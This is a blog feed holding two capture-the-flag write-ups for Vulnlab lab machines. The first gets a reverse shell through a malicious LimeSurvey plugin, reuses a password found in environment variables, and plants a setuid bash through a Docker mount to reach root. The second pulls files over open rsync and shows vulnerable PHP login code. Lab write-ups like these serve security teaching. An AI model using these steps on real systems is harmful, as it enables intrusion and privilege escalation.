<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-12-26T14:32:46+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">archive://syl</title><author><name>Dimitar Ganev</name></author><entry><title type="html">Vulnlab - Forgotten [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/12/26/vulnlab-forgotten.html" rel="alternate" type="text/html" title="Vulnlab - Forgotten [Easy]" /><published>2023-12-26T00:00:00+02:00</published><updated>2023-12-26T00:00:00+02:00</updated><id>http://localhost:4000/ctf-writeup/2023/12/26/vulnlab-forgotten</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/12/26/vulnlab-forgotten.html">&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;OS&lt;/th&gt;
      &lt;th&gt;Difficulty&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;Forgotten&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Linux&lt;/td&gt;
      &lt;td&gt;&lt;span style=&quot;color:green;&quot;&gt;Easy&lt;/span&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;We would find a website that we are going to fuzz and find an installation page for the &lt;strong&gt;LimeSurvey&lt;/strong&gt; software. Then we would set up our local database to work with the installation of that software and run it on the server. We would then install a malicious plugin so that we can gain remote code execution on the machine. Then we would find credentials in the environment variables that we can use to gain access to the SSH. After that, we are going to abuse the mount points of the docker image to gain root on the host machine.&lt;/p&gt;

&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial Foothold&lt;/h2&gt;

&lt;p&gt;Upon scanning the machine, we would find a couple of ports open ports.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo nmap -sS -sU 10.10.105.241 --min-rate 10000 --open -p-
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20231226123653.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Going to the web page, we would find that it results to status code 403, so the next step that we are going to take is to fuzz it&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ffuf -w $commontxt -u http://10.10.105.241/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20231226123711.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we would find an installation page for the software &lt;strong&gt;LimeSurvey&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20231226092416.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We are going to try to install it, however to do that we need to install &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql&lt;/code&gt; server onto our local server and expose it to the machine so that the system can connect to us, otherwise we would get:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ERROR 1130 (HY000): Host &apos;&amp;lt;MACHINE_IP&amp;gt;&apos; is not allowed to connect to this MySQL server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In order to do that, we would need to set our &lt;strong&gt;MySQL&lt;/strong&gt; server to accept connections from anywhere and create a user.&lt;/p&gt;

&lt;p&gt;First, we need to edit our configuration&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf
# Change &quot;bind-address&quot; to &quot;0.0.0.0&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we can connect using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; user and&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;forgotten&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDENTIFIED&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;BY&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;forgotten&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;GRANT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ALL&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;PRIVILEGES&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TO&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;forgotten&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;GRANT&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;OPTION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FLUSH&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;PRIVILEGES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We would then be able to install the &lt;strong&gt;LimeSurvey&lt;/strong&gt; and get into the admin panel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20231226095209.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can now research of some ways to get remote code execution on the machine using this software, a quick google search would lead us to this exploit: &lt;a href=&quot;https://github.com/Y1LD1R1M-1337/Limesurvey-RCE&quot;&gt;LimeSurvey RCE&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The exploit is leveraging the plugins feature of the software to install a malicious plugin which can connect to our listener.&lt;/p&gt;

&lt;p&gt;We can setup such plugin by cloning the repository and replacing the needed variables in the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php-rev.php&lt;/code&gt; after that we also need to edit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.xml&lt;/code&gt; and add the installed version of the &lt;strong&gt;LimeSurvey&lt;/strong&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;compatibility&amp;gt;&lt;/code&gt; element, after that we would zip the files and upload them.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ zip plg.zip ./php-rev.php ./config.xml 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can then navigate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php/admin/pluginmanager?sa=upload&lt;/code&gt; to upload our plugin. After we upload it and activate it, we can start a local listener with the given configuration earlier, and to execute our reverse shell we need to head to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/survey/upload/plugins/Y1LD1R1M/php-rev.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20231226130614.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can now run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas&lt;/code&gt; to enumerate further, and upon examining the output we would find this environment variable set in the beginning &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LIMESURVEY_PASS=5W5&amp;lt;REDACTED&amp;gt;&lt;/code&gt; we would also find that the current shell is running within a docker container.&lt;/p&gt;

&lt;p&gt;After finding that password I immediately tried it to change the user to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; in the current container which worked, and I also tried to SSH with the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;limesvc&lt;/code&gt; which also worked!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20231226131121.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And judging by the system information, it seems that we are not in the docker container anymore, if we list the home directory we would find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; flag.&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;We can use a tool called &lt;strong&gt;&lt;a href=&quot;https://github.com/cdk-team/CDK#cdk---zero-dependency-container-penetration-toolkit&quot;&gt;CDK - Zero Dependency Container Penetration Toolkit&lt;/a&gt;&lt;/strong&gt;  to inspect our docker container which runs the &lt;strong&gt;LimeSurvey&lt;/strong&gt; application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/Pasted image 20231226141545.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the &lt;strong&gt;Mounts&lt;/strong&gt; section we can see the listed mounts, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolv.conf | hostname | hosts&lt;/code&gt; are standard for every container but the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/limesurvey&lt;/code&gt; isn’t so we can check that out.&lt;/p&gt;

&lt;p&gt;We can see that the host has mounted the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/limesurvey&lt;/code&gt; directory in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/&lt;/code&gt; folder on the container, We can go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/&lt;/code&gt; to create a single file and check its permissions on the host system. Since that the docker container process is running as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; we would have the same permissions from within the container. The file that has been created is having &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; permissions.&lt;/p&gt;

&lt;p&gt;We can now try the same thing but with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; executable, we would try the following thing on the container:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash ./syl
root@efaa6f5097ed:/var/www/html/survey# chmod u+s ./syl
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now on the host machine we can invoke our binary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./syl&lt;/code&gt; and we should be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;limesvc@ip-xxx:/opt/limesurvey$ ./syl -p
syl-5.1# whoami
root
syl-5.1# cat /root/root.txt
VL{&amp;lt;REDACTED&amp;gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">Name OS Difficulty Forgotten Linux Easy</summary></entry><entry><title type="html">Vulnlab - Sync [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/12/24/vulnlab-sync.html" rel="alternate" type="text/html" title="Vulnlab - Sync [Easy]" /><published>2023-12-24T00:00:00+02:00</published><updated>2023-12-24T00:00:00+02:00</updated><id>http://localhost:4000/ctf-writeup/2023/12/24/vulnlab-sync</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/12/24/vulnlab-sync.html">&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;OS&lt;/th&gt;
      &lt;th&gt;Difficulty&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;Sync&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Linux (Ubuntu)&lt;/td&gt;
      &lt;td&gt;&lt;span style=&quot;color:green;&quot;&gt;Easy&lt;/span&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;We would find a TCP port &lt;em&gt;873&lt;/em&gt; open that is related to the &lt;a href=&quot;https://linux.die.net/man/1/rsync&quot;&gt;rsync&lt;/a&gt; utility, which we can connect to. Upon connecting, we would find folders related to the http server that is running. After the exfiltration of those files, we would find a SQLite3 database which contains several hashes of some users. The hashes are constructed a bit odd so we would create a simple utility in Go to help us bruteforce the hash, then we would use the FTP with the found credentials to put our public SSH key so that we can log in with SSH. Then we would find a folder related to some backups of the machine, we will exfiltrate those files, and we are going to try to crack the newly found credentials. Then we would be able to switch users again, and we are going to enumerate once more to find a running CRON job that we would use to gain the root access of the machine.&lt;/p&gt;

&lt;h2 id=&quot;exploitation--initial-foothold&quot;&gt;Exploitation / Initial Foothold&lt;/h2&gt;

&lt;p&gt;We would start with a nmap scan that would scan TCP and UDP ports.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Sync$ sudo nmap -sS -sU 10.10.64.96 --min-rate 10000 --open
Starting Nmap 7.80 ( https://nmap.org ) at 2023-12-25 11:16 EET
Nmap scan report for 10.10.64.96
Host is up (0.052s latency).
Not shown: 1002 closed ports, 994 open|filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
873/tcp open  rsync
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We find that the machine runs the utility &lt;strong&gt;rsync,&lt;/strong&gt; which is a utility for efficiently transferring and synchronizing files between a computer and a storage drive and across networked computers by comparing the modification times and sizes of files.&lt;/p&gt;

&lt;p&gt;We can connect to it by using it directly from our linux environment:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Sync$ rsync -av --list-only rsync://10.10.64.96/
httpd           web backup
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Sync$ rsync -av --list-only rsync://10.10.64.96/httpd
receiving incremental file list
drwxr-xr-x          4.096 2023/04/20 22:50:04 .
drwxr-xr-x          4.096 2023/04/20 23:13:22 db
-rw-r--r--         12.288 2023/04/20 22:50:42 db/site.db
drwxr-xr-x          4.096 2023/04/20 22:50:50 migrate
drwxr-xr-x          4.096 2023/04/20 23:13:15 www
-rw-r--r--          1.722 2023/04/20 23:02:54 www/dashboard.php
-rw-r--r--          2.315 2023/04/20 23:09:10 www/index.php
-rw-r--r--            101 2023/04/20 23:03:08 www/logout.php

sent 23 bytes  received 228 bytes  167,33 bytes/sec
total size is 16.426  speedup is 65,44
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We would see that there is an interesting file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;httpd/db/site.db&lt;/code&gt; which may contain some credentials, so let’s get that file along with the other files.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Sync$ rsync -chavzP --stats rsync://10.10.64.96/httpd/ ./exfiltrated/
receiving incremental file list
./
db/
db/site.db
         12,29K 100%   11,72MB/s    0:00:00 (xfr#1, to-chk=3/8)
migrate/
www/
www/dashboard.php
          1,72K 100%    1,64MB/s    0:00:00 (xfr#2, to-chk=2/8)
www/index.php
          2,31K 100%    2,21MB/s    0:00:00 (xfr#3, to-chk=1/8)
www/logout.php
            101 100%   98,63kB/s    0:00:00 (xfr#4, to-chk=0/8)

Number of files: 8 (reg: 4, dir: 4)
Number of created files: 7 (reg: 4, dir: 3)
Number of deleted files: 0
Number of regular files transferred: 4
Total file size: 16,43K bytes
Total transferred file size: 16,43K bytes
Literal data: 16,43K bytes
Matched data: 0 bytes
File list size: 278
File list generation time: 0,001 seconds
File list transfer time: 0,000 seconds
Total bytes sent: 119
Total bytes received: 2,25K

sent 119 bytes  received 2,25K bytes  1,58K bytes/sec
total size is 16,43K  speedup is 6,95
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, let’s run &lt;strong&gt;sqlite3&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;syl@sylsec:~/vulnlab/Sync$ sqlite3 ./exfiltrated/db/site.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter &quot;.help&quot; for usage hints.
sqlite&amp;gt; .tables
users
sqlite&amp;gt; select * from users;
1|admin|76&amp;lt;REDACTED&amp;gt;
2|triss|a0&amp;lt;REDACTED&amp;gt;
sqlite&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We would gather those users and hashes that we need to crack. Initially, I ran those md5 hashes through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; list, but they didn’t match anything, so I was curious why and went to look at the source code.&lt;/p&gt;

&lt;p&gt;In the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt; located in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www&lt;/code&gt; folder, we would find the following code snippet:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;session_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;6c4972f3717a5e881e282ad3105de01e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;username&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Location: dashboard.php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;username&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;password&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;username&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;password&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secure&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SQLite3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;../db/site.db&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SELECT * FROM users WHERE username = &apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos; AND password= &apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;fetchArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SQLITE3_ASSOC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;username&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;username&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;Location: dashboard.php&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$error_message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Invalid username or password.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that the hash is being created by the value of the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$secure&lt;/code&gt; the username and the password divided by a pipe.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I cracked those hashes with my own solution written in Go, however there might be an easier way of doing that with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat&lt;/code&gt; or other hash cracking tool.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Go&lt;/code&gt; code that we can use.&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;

